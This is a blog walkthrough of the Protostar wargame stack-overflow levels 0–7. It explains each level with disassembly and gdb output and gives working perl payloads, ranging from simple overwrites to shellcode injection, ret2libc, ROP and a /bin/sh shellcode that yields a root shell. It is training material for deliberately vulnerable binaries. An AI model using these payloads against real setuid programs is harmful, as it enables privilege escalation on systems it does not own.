<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta itemprop="name" content="Exploit Exercises - Protostar - Stack levels">
  <title>Exploit Exercises - Protostar - Stack levels</title>

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta itemprop="description" content="Exploit Exercises&#39; Protostar wargame includes a number of carefully prepared binary exploitation exercises. This is a write up of the stack level exploitation.">

  
  <meta itemprop="keywords" content="exploit exercises, protostar, challenge" />
  
    <meta itemprop="wordCount" content="2340">
  

  <meta property="og:title" content="Exploit Exercises - Protostar - Stack levels" />
  <meta property="og:description" content="This is my personal blog to keep track of stuff I am doing after hours." />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="http://camelinc.info/blog/2014/08/Exploit-Exercises---Protostar---Stack-levels/" />
  

  
  <meta property="og:updated_time" content="2014-08-31 16:07:14 &#43;0000 UTC"/>
  
  
  
  

  
    <meta name="twitter:card" content="summary"/>
  

  
  <meta name="twitter:title" content="Exploit Exercises - Protostar - Stack levels"/>
  <meta name="twitter:description" content="This is my personal blog to keep track of stuff I am doing after hours."/>
  
  

  

  <link href="http://camelinc.info//css/bootstrap.min.css" rel="stylesheet">
  <link href="http://camelinc.info//css/hc.css" rel="stylesheet">

  
  <link rel="stylesheet" href="http://camelinc.info//css/zenburn.css" type="text/css" media="screen" />

  

  
  <link rel="stylesheet" href="http://camelinc.info//lightbox/css/lightbox.css" type="text/css" media="screen">

  <meta name="generator" content="Hugo 0.37.1" />
  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
  
  
</head>


  <body>

  
<div class="nav-toggle"><i class="fa fa-bars fa-2x"></i> Herring Cove </div>
  <div id = "wrapper">

<div class="navbar navbar-default" role="navigation">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a href="http://camelinc.info//"><p class="navbar-brand">camelinc</p></a>
        </div>

        <div class="navbar-collapse collapse">
          <ul class="nav navbar-nav">
					
          <h2>http://camelinc.info/</h2>
					
					<li><a href="http://camelinc.info/about">About </a></li>
					
					<li><a href="http://camelinc.info/post">Posts </a></li>
					
          </ul>
        </div>
      </div>
    </div>

       
       <div id="sidebar-wrapper">
        <ul class="sidebar-nav">
					<img src="/img/avatar.png" />
          <li class="sidebar-brand"><a href="http://camelinc.info//"><h1 class="brand">camelinc</h1></a><h3>This is my personal blog to keep track of stuff I am doing after hours.</h3></li>
          <hr />

					
						<li><a href="http://camelinc.info/about">About </a></li>
					
						<li><a href="http://camelinc.info/post">Posts </a></li>
					
          <hr />

          <div id="social-wrapper">
           
             <li> <a href="https://twitter.com/camelinc"><i class="fa fa-twitter-square"></i> @twitter</a></li>
           

           
             
           

           
             
           

           
             <li> <a href="https://github.com/camelinc"><i class="fa fa-github-square"></i> github</a> </li>
           
         </div>

       </ul>
     </div>

     <div class="container">


  <div id="article">
    <div class="article-title">Exploit Exercises - Protostar - Stack levels</div>
    <p class="meta"><small>&nbsp;<i class="fa fa-calendar-o"></i> 2014-08-31</small></p> <hr/>
    <div class="post">
      

<h1 id="prequisites">Prequisites</h1>

<ul>
<li><a href="http://download.exploit-exercises.com/exploit-exercises-protostar-2.iso">Protostar ISO</a></li>
</ul>

<h1 id="stack-0">Stack 0</h1>

<p>For this scenario we need to overwrite the stack variable $modified.
To get a better idea about the binary a look at the assembly helps.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x080483f4 &lt;main+0&gt;:  push   %ebp
0x080483f5 &lt;main+1&gt;:  mov    %esp,%ebp
0x080483f7 &lt;main+3&gt;:  and    $0xfffffff0,%esp
0x080483fa &lt;main+6&gt;:  sub    $0x60,%esp
0x080483fd &lt;main+9&gt;:  movl   $0x0,0x5c(%esp)
0x08048405 &lt;main+17&gt;: lea    0x1c(%esp),%eax        ;load $buffer address into EAX
0x08048409 &lt;main+21&gt;: mov    %eax,(%esp)            ;set ESP
0x0804840c &lt;main+24&gt;: call   0x804830c &lt;gets@plt&gt;   ;vulnerable funtion
0x08048411 &lt;main+29&gt;: mov    0x5c(%esp),%eax        ;load $modified into EAX
0x08048415 &lt;main+33&gt;: test   %eax,%eax              ;Sets ZF
0x08048417 &lt;main+35&gt;: je     0x8048427 &lt;main+51&gt;    ;$modified was not modified
0x08048419 &lt;main+37&gt;: movl   $0x8048500,(%esp)
0x08048420 &lt;main+44&gt;: call   0x804832c &lt;puts@plt&gt;
0x08048425 &lt;main+49&gt;: jmp    0x8048433 &lt;main+63&gt;
0x08048427 &lt;main+51&gt;: movl   $0x8048529,(%esp)      ;target for main+35
0x0804842e &lt;main+58&gt;: call   0x804832c &lt;puts@plt&gt;
0x08048433 &lt;main+63&gt;: leave  
0x08048434 &lt;main+64&gt;: ret    </code></pre></div>

<p>In order to overwrite the $modified variable the following command is sufficient to do the task.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/$/usr/bin/perl -e &#39;print(&#34;A&#34;x65);&#39; | /opt/protostar/bin/stack0</code></pre></div>

<p>Finally, we examine the assembly closer.
The $buffer variable is stored at 0x1c.
The $modified is located at 0x5c.
In order to modify $modified we need to write 0x40+1 bytes at main+24.</p>

<h1 id="stack-1">Stack 1</h1>

<p>In this scenario we have to write a specific value on the stack.
First, we take a look at the important changes in the assembly.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">...
0x080484a7 &lt;main+67&gt;:   mov    0x5c(%esp),%eax         ;load $modified into EAX
0x080484ab &lt;main+71&gt;:   cmp    $0x61626364,%eax        ;compare against 0x61626364
0x080484b0 &lt;main+76&gt;:   jne    0x80484c0 &lt;main+92&gt;
...</code></pre></div>

<p>This time the test is against a static value.
The offset for the stack variable is still the same.
As the code is little endian, the desired vektor is simply &ldquo;dcba&rdquo;.
The respective command to manipulate the execution path is as follows:</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/$/opt/protostar/bin/stack1 `/usr/bin/perl -e &#39;print(&#34;A&#34;x64 .&#34;dcba&#34;);&#39;`</code></pre></div>

<h1 id="stack-2">Stack 2</h1>

<p>This level requests use to set the GRENNIE environment variable.
We extracted the relevant parts of the assembly.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">...
0x0804849d &lt;main+9&gt;:  movl   $0x80485e0,(%esp)
0x080484a4 &lt;main+16&gt;: call   0x804837c &lt;getenv@plt&gt;  ;retrieves an ENV variable
0x080484a9 &lt;main+21&gt;: mov    %eax,0x5c(%esp)         ;store on stack
...
0x080484c8 &lt;main+52&gt;: movl   $0x0,0x58(%esp)         ;initialise $modified
...
0x080484d8 &lt;main+68&gt;: lea    0x18(%esp),%eax         ;load $buffer address into EAX
0x080484dc &lt;main+72&gt;: mov    %eax,(%esp)
0x080484df &lt;main+75&gt;: call   0x804839c &lt;strcpy@plt&gt;  ;vulnerable function
0x080484e4 &lt;main+80&gt;: mov    0x58(%esp),%eax         ;
0x080484e8 &lt;main+84&gt;: cmp    $0xd0a0d0a,%eax         ;compare against 0xd0a0d0a
0x080484ed &lt;main+89&gt;: jne    0x80484fd &lt;main+105&gt;
...</code></pre></div>

<p>The binary makes use of the unsecure strcpy function.
We can spot the offset for the $modified variable at main+52.
Again, the $buffer variable ist 0x40 bytes which results in the following command to complete the level.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/$export GREENIE=`perl -e &#39;print(&#34;A&#34;x64 . &#34;\x0a\x0d\x0a\x0d&#34;);&#39;` &amp;&amp; /opt/protostar/bin/stack2</code></pre></div>

<h1 id="stack-3">Stack 3</h1>

<p>In the level we have to overwrite a function pointer.
Let us first examine the relevant parts of the disassembly.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">...
0x08048449 &lt;main+17&gt;: lea    0x1c(%esp),%eax       ;load address of $buffer
0x0804844d &lt;main+21&gt;: mov    %eax,(%esp)
0x08048450 &lt;main+24&gt;: call   0x8048330 &lt;gets@plt&gt;  ;vulnerable function

...
0x08048471 &lt;main+57&gt;: mov    0x5c(%esp),%eax       ;load $fp into EAX
0x08048475 &lt;main+61&gt;: call   %eax                  ;execute EAX</code></pre></div>

<p>The functionality is again base on level 0.
We have to write 0x40 bytes to gain control of the execution flow.
The right address of win() can be identified via objdump: 0x8048424.
We can simply adjust the command from level 1 to include the respective address.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/$perl -e &#39;print(&#34;A&#34;x64 .&#34;\x24\x84\x04\x08&#34;);&#39; | /opt/protostar/bin/stack3</code></pre></div>

<h1 id="stack-4">Stack 4</h1>

<p>The next step after level 3 is to directly overwrite EIP.
A look at the disassembly before starting.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x08048408 &lt;main+0&gt;:  push   %ebp
0x08048409 &lt;main+1&gt;:  mov    %esp,%ebp
0x0804840b &lt;main+3&gt;:  and    $0xfffffff0,%esp
0x0804840e &lt;main+6&gt;:  sub    $0x50,%esp
0x08048411 &lt;main+9&gt;:  lea    0x10(%esp),%eax       ;
0x08048415 &lt;main+13&gt;: mov    %eax,(%esp)
0x08048418 &lt;main+16&gt;: call   0x804830c &lt;gets@plt&gt;  ;vulnerable function
0x0804841d &lt;main+21&gt;: leave  
0x0804841e &lt;main+22&gt;: ret    </code></pre></div>

<p>Again, $buffer is 0x40 bytes of size.
For this level we need to perform a jump to: 0x080483f4.
In order to overwrite EIP we need to identify the number of bytes to write.
To do so we have to take a look at the stack frame structure:</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">|                 | High memory addresses
|    Parameters   |
|  Return Address |
|   Base Pointer  | - EBP
|    buffer[64]   |
|                 | - ESP
|                 | Low  memory addresses</code></pre></div>

<p>With this knowledge we can examine the stack at main+21.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">(gdb) x/2x $ebp
0xbffff658: 0xbffff6d8  0xb7eadc76
(gdb) x/24x $esp
0xbffff600: 0xbffff610  0xb7ec6165  0xbffff618  0xb7eada75
0xbffff610: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffff620: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffff630: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffff640: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffff650: 0x08048400  0x00000000  0xbffff6d8  0xb7eadc76</code></pre></div>

<p>The pictures shows that the value of EBP is located at ESP+92.
This sums up to 76 bytes we need to write before we can control the return address.
The respective command ist a follows:</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/$perl -e &#39;print(&#34;A&#34;x64 .&#34;B&#34;x4 .&#34;C&#34;x4 .&#34;D&#34;x4 .&#34;\xf4\x83\x04\x08&#34;);&#39; | /opt/protostar/bin/stack4</code></pre></div>

<h1 id="stack-5">Stack 5</h1>

<p>The goal now is to inject our own shellcode.
We have got the following assembly:</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x080483c4 &lt;main+0&gt;:  push   %ebp
0x080483c5 &lt;main+1&gt;:  mov    %esp,%ebp
0x080483c7 &lt;main+3&gt;:  and    $0xfffffff0,%esp
0x080483ca &lt;main+6&gt;:  sub    $0x50,%esp
0x080483cd &lt;main+9&gt;:  lea    0x10(%esp),%eax
0x080483d1 &lt;main+13&gt;: mov    %eax,(%esp)
0x080483d4 &lt;main+16&gt;: call   0x80482e8 &lt;gets@plt&gt;
0x080483d9 &lt;main+21&gt;: leave  
0x080483da &lt;main+22&gt;: ret  </code></pre></div>

<p>The return address should be the start of $buffer at 0xbffff610.
From the previous example we know that we have to write 76 bytes.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">Starting program: /opt/protostar/bin/stack5 &lt; /tmp/vec5_1

Breakpoint 1, main (argc=0, argv=0xbffff704) at stack5/stack5.c:11
11  stack5/stack5.c: No such file or directory.
  in stack5/stack5.c
(gdb) x/24x $esp
0xbffff600: 0xbffff610  0xb7ec6165  0xbffff618  0xb7eada75
0xbffff610: 0xcccccccc  0xcccccccc  0xcccccccc  0xcccccccc
0xbffff620: 0xcccccccc  0xcccccccc  0xcccccccc  0xcccccccc
0xbffff630: 0xcccccccc  0xcccccccc  0xcccccccc  0xcccccccc
0xbffff640: 0xcccccccc  0xcccccccc  0xcccccccc  0xcccccccc
0xbffff650: 0xcccccccc  0xcccccccc  0xcccccccc  0xbffff610</code></pre></div>

<p>After that we can add a simple shell code.
For demonstration purpose a simple &ldquo;hello world&rdquo; shellcode will do.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/$perl -e &#39;print(&#34;\xe9\x1e\x00\x00\x00&#34; .&#34;\xb8\x04\x00\x00\x00&#34; .&#34;\xbb\x01\x00\x00\x00&#34; .&#34;\x59&#34; .&#34;\xba\x0f\x00\x00\x00&#34; .&#34;\xcd\x80&#34; .&#34;\xb8\x01\x00\x00\x00&#34; .&#34;\xbb\x00\x00\x00\x00&#34; .&#34;\xcd\x80&#34; .&#34;\xe8\xdd\xff\xff\xff&#34; .&#34;\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21&#34; .&#34;\xCC&#34;x(76-53) .&#34;\x10\xf6\xff\xbf&#34;);&#39; &gt; /tmp/vec5</code></pre></div>

<p>Debugging the shellcode in gdb works.
<strong>Stack addresses change with gdb attached.</strong>
So we have to start from a core dump.
To enable core dumps on suid binaries we have to set the proper flag.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/$echo 2 &gt; /proc/sys/fs/suid_dumpable</code></pre></div>

<p>Now we can try to run the exploit code directly against the binary.
The exploit fails but a core dump is created.
With gdb we can now examine the stack and adjust the offsets.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">user@protostar:/$gdb /opt/protostar/bin/stack5 --core /tmp/core.4.stack5.3688
GNU gdb (GDB) 7.0.1-debian
...
Core was generated by &#39;/opt/protostar/bin/stack5&#39;.
Program terminated with signal 4, Illegal instruction.
#0  0xbffff645 in ?? ()
(gdb) x/24x 0xbffff610
0xbffff610: 0xbffff620  0xb7ec6165  0xbffff628  0xb7eada75
0xbffff620: 0x00001ee9  0x0004b800  0x01bb0000  0x59000000
0xbffff630: 0x00000fba  0xb880cd00  0x00000001  0x000000bb
0xbffff640: 0xe880cd00  0xffffffdd  0x6c6c6548  0x57202c6f
0xbffff650: 0x646c726f  0xcccccc21  0xcccccccc  0xcccccccc
0xbffff660: 0xcccccccc  0xcccccccc  0xcccccccc  0xbffff640</code></pre></div>

<p>The correct offset should be 0xbffff620.
Let&rsquo;s try again with the following command.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/$perl -e &#39;print(&#34;\xe9\x1e\x00\x00\x00&#34; .&#34;\xb8\x04\x00\x00\x00&#34; .&#34;\xbb\x01\x00\x00\x00&#34; .&#34;\x59&#34; .&#34;\xba\x0f\x00\x00\x00&#34; .&#34;\xcd\x80&#34; .&#34;\xb8\x01\x00\x00\x00&#34; .&#34;\xbb\x00\x00\x00\x00&#34; .&#34;\xcd\x80&#34; .&#34;\xe8\xdd\xff\xff\xff&#34; .&#34;\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21&#34; .&#34;\xCC&#34;x(76-53) .&#34;\x20\xf6\xff\xbf&#34;);&#39; | /opt/protostar/bin/stack5
Hello, World!�</code></pre></div>

<h1 id="stack-6">Stack 6</h1>

<p>At first, we have to identify the location of the overflow.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x080484a4 &lt;getpath+32&gt;:  lea    -0x4c(%ebp),%eax
0x080484a7 &lt;getpath+35&gt;:  mov    %eax,(%esp)
0x080484aa &lt;getpath+38&gt;:  call   0x8048380 &lt;gets@plt&gt;</code></pre></div>

<p>The code loads the address of EBP-0x4c into EAX.
So to overwrite the return address we have to write 0x50 bytes.
Let&rsquo;s test the alignment.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">(gdb) x/40x $ebp-100
0xbffff5e4: 0x00000000  0xb7fe1b28  0x00000001  0x00000000
0xbffff5f4: 0x00000001  0xb7fff8f8  0xcccccccc  0xcccccccc
0xbffff604: 0xcccccccc  0xcccccccc  0xcccccccc  0xcccccccc
0xbffff614: 0xcccccccc  0xcccccccc  0xcccccccc  0xcccccccc
0xbffff624: 0xcccccccc  0xcccccccc  0xcccccccc  0xcccccccc
0xbffff634: 0xcccccccc  0xcccccccc  0xcccccccc  0xcccccccc
0xbffff644: 0xcccccccc  0xcccccccc  0x08048500  0x08048520
0xbffff654: 0x00000000  0xbffff6d8  0xb7eadc76  0x00000001</code></pre></div>

<p>It worked!
The next step is to set EIP.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/$perl -e &#39;print(&#34;\xCC&#34;x80 .&#34;\xfc\xf5\xff\xbf&#34;);&#39; | /opt/protostar/bin/stack6
input path please: bzzzt (0xbffff604)</code></pre></div>

<p>This did not work.
Lets examine what&rsquo;s going on.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">0x080484af &lt;getpath+43&gt;:  mov    0x4(%ebp),%eax     ; load return address
0x080484b2 &lt;getpath+46&gt;:  mov    %eax,-0xc(%ebp)
0x080484b5 &lt;getpath+49&gt;:  mov    -0xc(%ebp),%eax
0x080484b8 &lt;getpath+52&gt;:  and    $0xbf000000,%eax   ; apply mask
0x080484bd &lt;getpath+57&gt;:  cmp    $0xbf000000,%eax   ; check address
0x080484c2 &lt;getpath+62&gt;:  jne    0x80484e4</code></pre></div>

<p>The binary checks whether the return address starts with \xbf.
Our shellcode is placed in exactly this part of memory.
This means that we cannot simply return to our shellcode
Instead we have to find another way to exploit the overflow.</p>

<h2 id="duplicate-payload">Duplicate Payload</h2>

<p>The first option is when our payload is also loaded into another memory location.
In order to look for a location the need to debug the binary.
With gdb we can even search the memory for a pattern.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">(gdb) info files
Symbols from &#34;/opt/protostar/bin/stack6&#34;.
Local core dump file:
  &#39;/tmp/core.11.stack6.3845&#39;, file type elf32-i386.
  0x08048000 - 0x08049000 is load1
  0x08049000 - 0x0804a000 is load2
  0xb7e96000 - 0xb7e97000 is load3
  0xb7e97000 - 0xb7e98000 is load4a
  0xb7e98000 - 0xb7e98000 is load4b
  0xb7fd5000 - 0xb7fd5000 is load5
  0xb7fd6000 - 0xb7fd8000 is load6
  0xb7fd8000 - 0xb7fd9000 is load7
  0xb7fd9000 - 0xb7fdc000 is load8
  0xb7fde000 - 0xb7fe2000 is load9
...
(gdb) find /w1 0xb7fde000, 0xb7fde200, 0xcccccccc
0xb7fde000
1 pattern found.
(gdb) x/40x 0xb7fde000
0xb7fde000: 0xcccccccc  0xcccccccc  0xcccccccc  0xcccccccc
0xb7fde010: 0xcccccccc  0xcccccccc  0xcccccccc  0xcccccccc
0xb7fde020: 0xcccccccc  0xcccccccc  0xcccccccc  0xcccccccc
0xb7fde030: 0xcccccccc  0xcccccccc  0xcccccccc  0xcccccccc
0xb7fde040: 0xcccccccc  0xcccccccc  0xcccccccc  0xcccccccc
0xb7fde050: 0xbffff5fc  0x00000000  0x00000000  0x00000000
0xb7fde060: 0x00000000  0x00000000  0x00000000  0x00000000</code></pre></div>

<p>We are lucky, our data is also stored outside of the filtered memory space.
To exploit the overflow we cansimply stick to the Hello World shellcode.
Subsequently, we only have to update the return address in order to successfully return to our shellcode.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/$perl -e &#39;print(&#34;\x90&#34;x4 .&#34;\xe9\x1e\x00\x00\x00&#34; .&#34;\xb8\x04\x00\x00\x00&#34; .&#34;\xbb\x01\x00\x00\x00&#34; .&#34;\x59&#34; .&#34;\xba\x0f\x00\x00\x00&#34; .&#34;\xcd\x80&#34; .&#34;\xb8\x01\x00\x00\x00&#34; .&#34;\xbb\x00\x00\x00\x00&#34; .&#34;\xcd\x80&#34; .&#34;\xe8\xdd\xff\xff\xff&#34; .&#34;\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21&#34; .&#34;\xCC&#34;x(80-53-4) .&#34;\x04\xe0\xfd\xb7&#34;);&#39; | /opt/protostar/bin/stack6
input path please: got path �����
Hello, World!�</code></pre></div>

<h2 id="ret2libc">ret2Libc</h2>

<p>Another option we have got is utilizing library functionality loaded during runtime.
To do this we have to understand the respective functions and their arguments.
For this example we are going to stick with the system() function call to execute our code.
This will provide us with a root shell.
Another option would be the use of execl() with the respective arguments.
Let&rsquo;s quickly take a look at the memory layout before exploitation.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console"> ------------ ----------- -----------
| buffer[64] | saved EBP | saved EIP |
 ------------ ----------- -----------
 and after the overflow
 ------------ ----------- ----------- ------------ ------------
|       buffer[80]       | &amp;system() |   &amp;exit()  | &amp;shellcode |
 ------------ ----------- ----------- ------------ ------------</code></pre></div>

<p>In this example we will utilize system() and exit().
The corresponding addresses can be retrieved via gdb.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">(gdb) print system
$1 = {&lt;text variable, no debug info&gt;} 0xb7ecffb0 &lt;__libc_system&gt;
(gdb) print exit
$2 = {&lt;text variable, no debug info&gt;} 0xb7ec60c0 &lt;GI_exit&gt;</code></pre></div>

<p>Remember, we are going to execute a payload via system().
Therefore, the environment variable will contain the path to the shellcode.
The shellcode in this example is simply a binary.
The absolute path to the respective binary will be stored in a environment variable.
We then have to calculate the address of the variable during runtime.
To do this, just grab an appropriate script online that helps you doing so.
This adress is placed on the stack to act as an argument for system().</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/$ export CODE=&#34;/home/user/13357&#34;
user@protostar:/$ /home/user/getenvaddr CODE /opt/protostar/bin/stack6
CODE will be at 0xbfffff8d</code></pre></div>

<p>Now we have all the essential pointers and only need to prepare the shellcode.
So this time we want to gain a root shell with the exploit.
<strong>Keep in mind that bash will drop all privileges.</strong>
Therefore we are going to utilize a shellcode from exploit-db <a href="http://www.exploit-db.com/exploits/13357/">13367</a>.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/opt/protostar/bin$ perl -e &#39;print(&#34;\xCC&#34;x(80) .&#34;\xb0\xff\xec\xb7&#34; .&#34;\xc0\x60\xec\xb7&#34; .&#34;\x8d\xff\xff\xbf&#34;);&#39; | /opt/protostar/bin/stack6
input path please: got path �����
# whoami
root</code></pre></div>

<h2 id="rop">ROP</h2>

<p>One more option we do have is utilizing return-oriented programming.
This is especially useful when we encounter NX technology.
Also, ASLR does not affect the program code itself.
This means, ASLR can also be defeated.
For this scenario, we simply take the next RET function at hand.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">(gdb) disassemble getpath
...
0x080484f9 &lt;getpath+117&gt;: ret</code></pre></div>

<p>So we have to set the return address to 0x080484f9.
The return address is set to point at our buffer at 0xbffff5ac.</p>

<p>Usually ROP is utilized to circumvent DEP protection.
Again, we place our Hello world payload in the buffer.
The exploit can be triggered via the following command.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/$ perl -e &#39;print(&#34;\x90&#34;x4 .&#34;\xe9\x1e\x00\x00\x00&#34; .&#34;\xb8\x04\x00\x00\x00&#34; .&#34;\xbb\x01\x00\x00\x00&#34; .&#34;\x59&#34; .&#34;\xba\x0f\x00\x00\x00&#34; .&#34;\xcd\x80&#34; .&#34;\xb8\x01\x00\x00\x00&#34; .&#34;\xbb\x00\x00\x00\x00&#34; .&#34;\xcd\x80&#34; .&#34;\xe8\xdd\xff\xff\xff&#34; .&#34;\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21&#34; .&#34;\xCC&#34;x(80-53-4) .&#34;\xf9\x84\x04\x08&#34; .&#34;\xdc\xf5\xff\xbf&#34;);&#39; | /opt/protostar/bin/stack6
input path please: got path �����
Hello, World!�</code></pre></div>

<h1 id="stack-7">Stack 7</h1>

<p>This example is based binary from the previous exercise.
Although, this time the return address is again restricted.
So, we need to find another way to execute our payload.
Let&rsquo;s take a look at the source code.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">...
0x080484ea &lt;getpath+38&gt;:	call   0x80483a4 &lt;gets@plt&gt;
0x080484ef &lt;getpath+43&gt;:	mov    0x4(%ebp),%eax
0x080484f2 &lt;getpath+46&gt;:	mov    %eax,-0xc(%ebp)
0x080484f5 &lt;getpath+49&gt;:	mov    -0xc(%ebp),%eax         ; copy return address into EAX
0x080484f8 &lt;getpath+52&gt;:	and    $0xb0000000,%eax        ; zero out all non important bits
0x080484fd &lt;getpath+57&gt;:	cmp    $0xb0000000,%eax        ; check first byte of address
0x08048502 &lt;getpath+62&gt;:	jne    0x8048524 &lt;getpath+96&gt;
...
0x0804853e &lt;getpath+122&gt;:	call   0x80483f4 &lt;strdup@plt&gt;
0x08048543 &lt;getpath+127&gt;: leave  
0x08048544 &lt;getpath+128&gt;: ret    </code></pre></div>

<h2 id="strdup">strdup</h2>

<p>Fortunately for us, strdup() is called just before returning.
The function copies the target buffer to the heap.
The return value, the address of the target buffer, is stored in EAX.
So we simply need to overwrite the return address with a call to EAX.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">Program received signal SIGSEGV, Segmentation fault.
--------------------------------------------------------------------------[regs]
  EAX: 0x0804A008  EBX: 0xB7FD7FF4  ECX: 0x00000000  EDX: 0x00000001  o d I t s z a p c
  ESI: 0x00000000  EDI: 0x00000000  EBP: 0xCCCCCCCC  ESP: 0xBFFFF630  EIP: 0x41414141
  CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B</code></pre></div>

<p>With objdump we can find a suiteable location with the respective call to EAX.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">user@protostar:/$ objdump -d stack7 | grep -iP &#34;call.*eax&#34;
 8048478:	ff 14 85 5c 96 04 08 	call   *0x804965c(,%eax,4)
 80484bf:	ff d0                	call   *%eax
 80485eb:	ff d0                	call   *%eax</code></pre></div>

<p>So we only need to apply a suitable shellcode to exploit the flaw.
The respective command is as follows.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/$ perl -e &#39;print(&#34;\x90&#34;x4 .&#34;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&#34; .&#34;\xCC&#34;x(80-55-4) .&#34;\xeb\x85\x04\x08&#34; );&#39; | /opt/protostar/bin/stack7
input path please: got path ����1�1۰̀Sh/ttyh/dev��&#39;�̀1�Ph//shh/bin�S�ᙰ
                                                                    ̀�
# whoami
root</code></pre></div>

<h2 id="rop-1">ROP</h2>

<p>With the knowledge from the previous example we can also try return oriented programming.
We need to find the address of a ret call.</p>

<div class="highlight"><pre class="chroma"><code class="language-c-objdump" data-lang="c-objdump">(gdb) disassemble getpath
...
0x08048544 &lt;getpath+128&gt;:       ret    </code></pre></div>

<p>The parameter for the function call is once again the beginning of the buffer.
In particular this is 0xbfffff5dc.
The final command to exploit the vulnerability is as follows.</p>

<div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">user@protostar:/$ perl -e &#39;print(&#34;\x90&#34;x4 .&#34;\xe9\x1e\x00\x00\x00&#34; .&#34;\xb8\x04\x00\x00\x00&#34; .&#34;\xbb\x01\x00\x00\x00&#34; .&#34;\x59&#34; .&#34;\xba\x0f\x00\x00\x00&#34; .&#34;\xcd\x80&#34; .&#34;\xb8\x01\x00\x00\x00&#34; .&#34;\xbb\x00\x00\x00\x00&#34; .&#34;\xcd\x80&#34; .&#34;\xe8\xdd\xff\xff\xff&#34; .&#34;\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x21&#34; .&#34;\xCC&#34;x(80-53-4) .&#34;\x44\x85\x04\x08&#34; .&#34;\xdc\xf5\xff\xbf&#34;);&#39; | /opt/protostar/bin/stack7
input path please: got path �����
Hello, World!�</code></pre></div>

<h1 id="links-and-references">Links and References</h1>

<h2 id="exploit-exercises">Exploit Exercises</h2>

<ul>
<li><a href="http://exploit-exercises.com/protostar">exploit-exercises.com - Protostar</a></li>
<li><a href="https://www.mattandreko.com/categories/protostar/">MattAndreko: Protostar</a></li>
<li><a href="https://code.google.com/p/protostar-solutions/">Exploit exercises protostar</a></li>
<li><a href="https://thesprawl.org/research/exploit-exercises-protostar-stack/">TheSprawl - protostar - stack levels</a></li>
<li><a href="http://louisrli.github.io/blog/2012/08/28/protostar-stack2/">Louis Li</a></li>
</ul>

<h2 id="return-oriented-programming">Return-oriented Programming</h2>

<ul>
<li><a href="http://www.win.tue.nl/~aeb/linux/hh/hh-10.html#ss10.8">Hackers Hut</a></li>
<li><a href="http://www.fuzzysecurity.com/tutorials/expDev/7.html">FuzzySecurity ExploitDev: Part 7</a></li>
</ul>

<h2 id="other">Other</h2>

<ul>
